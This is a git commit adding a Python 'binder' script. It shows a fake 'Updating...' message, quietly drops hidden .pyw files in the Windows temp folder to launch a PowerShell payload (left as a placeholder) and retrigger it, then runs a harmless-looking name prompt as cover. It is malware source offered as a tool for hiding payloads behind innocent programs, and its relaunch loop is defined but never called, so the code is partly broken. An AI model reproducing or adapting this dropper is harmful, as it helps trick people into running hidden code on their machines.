99a0f84aaf2652f85f13550aeb1910e47f64637e
Traventhewhitehat <swagerhack3r@gmail.com>
2016-07-13 09:00:00 -0400

    Update and rename auto.py to Binder.py

---
+++ Binder.py
@@ -0,0 +1,36 @@
+import os
+import time
+import urllib
+import subprocess
+
+print "Updating..."
+back = open("C:\Windows\Temp\sss.pyw", "w")
+back.write("import subprocess")
+back.write("\n")
+back.write("subprocess.Popen(' POWERSHELL SRC CODE',  shell=True)") #powershell source
+back.close()
+arquivo = open("C:\Windows\Temp\ss.pyw", "w")
+arquivo.write("import time")
+arquivo.write("\n")
+arquivo.write("import subprocess")
+arquivo.write("\n")
+arquivo.write("time.sleep(2)")
+arquivo.write("\n")
+arquivo.write("xa = 1")
+arquivo.write("\n")
+arquivo.write("def dexter():")
+arquivo.write("\n")
+arquivo.write("	while xa == 1:")
+arquivo.write("\n")
+arquivo.write('		subprocess.Popen("C:\Windows\Temp\sss.pyw", shell=True)')
+arquivo.write("\n")
+arquivo.write("		time.sleep(5)")
+arquivo.write("\n")
+arquivo.close()
+time.sleep(1)
+subprocess.Popen("C:\Windows\Temp\ss.pyw", shell=True)
+
+#Your python script
+print "Hello"
+name = raw_input("What is your name?")
+print "Your name is %s" %(name)
